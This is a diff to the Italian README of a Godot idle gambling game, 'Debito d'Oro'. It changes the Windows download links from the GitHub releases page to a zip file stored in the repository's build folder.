@@ -2,7 +2,7 @@
 
 > **Gioco incrementale / idle a tema azzardo** realizzato in **Godot 4.3** (GDScript puro, grafica e audio 100% procedurali).
 >
-> **[⬇ SCARICA L'ESEGUIBILE WINDOWS (.exe) DALL'ULTIMA RELEASE](https://github.com/MirkoVanzetto/debito-doro/releases/latest)**
+> **[⬇ SCARICA L'ESEGUIBILE WINDOWS (.exe) DALL'ULTIMA RELEASE](https://github.com/MirkoVanzetto/debito-doro/raw/main/build/DebitoDOro-Windows.zip)**
 
 ![La Sala](docs/sala.png)
 
@@ -34,7 +34,7 @@ Gioca tu stesso ai **Gratta e Vinci**, alla **Slot 777** e al **Tavolo dei Dadi*
 - **Salvataggio automatico** ogni 10 secondi + calcolo dei guadagni offline al rientro.
 
 ## Come giocare
-1. Vai nella sezione **[Releases](https://github.com/MirkoVanzetto/debito-doro/releases/latest)** e scarica `DebitoDOro.exe` (oppure `DebitoDOro-Windows.zip`).
+1. Vai nella sezione **[Releases](https://github.com/MirkoVanzetto/debito-doro/raw/main/build/DebitoDOro-Windows.zip)** e scarica `DebitoDOro.exe` (oppure `DebitoDOro-Windows.zip`).
 2. Avvia `DebitoDOro.exe` su Windows (64-bit) — è un **singolo file portatile**, non serve installazione.
 
 ### Aprire / compilare il progetto da sorgente
